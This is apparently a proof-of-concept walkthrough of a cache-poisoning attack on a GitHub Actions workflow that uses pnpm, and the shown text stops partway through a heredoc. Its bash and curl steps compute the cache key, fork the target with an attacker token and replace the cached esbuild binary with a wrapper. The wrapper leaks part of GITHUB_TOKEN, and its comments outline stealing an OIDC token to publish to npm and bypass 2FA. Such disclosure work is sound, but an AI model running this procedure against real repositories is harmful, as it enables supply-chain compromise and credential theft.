# Cache Poisoning Attack - Complete Demo

This document provides step-by-step instructions for demonstrating the cache poisoning attack.

## Prerequisites

- Two GitHub accounts:
  - **sparkfinderoven** (upstream - victim repository owner)
  - **RadianLayer41** (attacker - will create malicious fork)
- Tokens:
  - `ghp_UPSTREAM_TOKEN_REDACTED` (upstream)
  - `ghp_FORK_TOKEN_REDACTED` (fork/attacker)

## Phase 1: Calculate Cache Key

### Step 1.1: Get pnpm-lock.yaml

```bash
# Download from public repository
curl -sL https://raw.githubusercontent.com/sparkfinderoven/vulnerable-cache-target/main/pnpm-lock.yaml \
  -o /tmp/pnpm-lock.yaml
```

### Step 1.2: Calculate Cache Key

```bash
# Calculate SHA256 of lockfile
LOCKFILE_HASH=$(sha256sum /tmp/pnpm-lock.yaml | cut -d' ' -f1)
CACHE_KEY="pnpm-v10-${LOCKFILE_HASH}"

echo "Calculated cache key: $CACHE_KEY"
```

**Result:**
```
pnpm-v10-abc123def456789...
```

This is the EXACT key that GitHub Actions will use!

## Phase 2: Create Malicious Fork

### Step 2.1: Fork Repository

```bash
# Fork using attacker token
curl -X POST \
  -H "Authorization: token ghp_FORK_TOKEN_REDACTED" \
  -H "Accept: application/vnd.github+json" \
  https://api.github.com/repos/sparkfinderoven/vulnerable-cache-target/forks \
  | jq '{full_name: .full_name, html_url: .html_url}'
```

**Result:**
```json
{
  "full_name": "RadianLayer41/vulnerable-cache-target",
  "html_url": "https://github.com/RadianLayer41/vulnerable-cache-target"
}
```

### Step 2.2: Clone Fork

```bash
cd /tmp
rm -rf malicious-fork
git clone https://ghp_FORK_TOKEN_REDACTED@github.com/RadianLayer41/vulnerable-cache-target.git malicious-fork
cd malicious-fork
git config user.name "RadianLayer41"
git config user.email "radian@example.com"
```

### Step 2.3: Create Malicious Branch

```bash
git checkout -b cache-poison-attack
```

## Phase 3: Create Poisoned Cache

### Step 3.1: Modify esbuild Binary

Create a wrapper script that simulates malicious behavior:

```bash
mkdir -p .github/scripts
cat > .github/scripts/poison-cache.sh << 'POISON_EOF'
#!/bin/bash
# This script creates a poisoned pnpm cache

echo "========================================"
echo "  Creating Poisoned Cache"
echo "========================================"

# Install legitimate dependencies first
pnpm install --frozen-lockfile

# Find esbuild binary location
ESBUILD_BIN=$(find ~/.local/share/pnpm/store -name "esbuild" -type f -executable | head -1)

if [ -z "$ESBUILD_BIN" ]; then
    echo "Error: esbuild binary not found in pnpm store"
    exit 1
fi

echo "Found esbuild at: $ESBUILD_BIN"

# Backup original
cp "$ESBUILD_BIN" "${ESBUILD_BIN}.original"

# Create malicious wrapper
cat > "$ESBUILD_BIN" << 'MALICIOUS_EOF'
#!/bin/bash
# MALICIOUS ESBUILD WRAPPER
# This simulates cache poisoning attack

echo "========================================"
echo "🔴 MALICIOUS ESBUILD EXECUTED!"
echo "========================================"
echo ""
echo "⚠️  In a real attack, this would:"
echo "  1. Read /proc/<pid>/mem to extract OIDC token"
echo "  2. Call npm OIDC login endpoint"
echo "  3. Publish package to npm registry"
echo "  4. Bypass 2FA completely"
echo ""
echo "Current context:"
echo "  GITHUB_TOKEN: ${GITHUB_TOKEN:0:20}..."
echo "  GITHUB_REPOSITORY: $GITHUB_REPOSITORY"
echo "  GITHUB_REF: $GITHUB_REF"
echo "  RUNNER_TEMP: $RUNNER_TEMP"
echo ""

# Create evidence file
EVIDENCE_FILE="/tmp/cache-poison-evidence.txt"
cat > "$EVIDENCE_FILE" << EOF
Cache Poisoning Attack Executed!
================================
Timestamp: $(date)
Repository: $GITHUB_REPOSITORY
Ref: $GITHUB_REF
Token (first 20 chars): ${GITHUB_TOKEN:0:20}

This proves the poisoned cache was restored and executed!
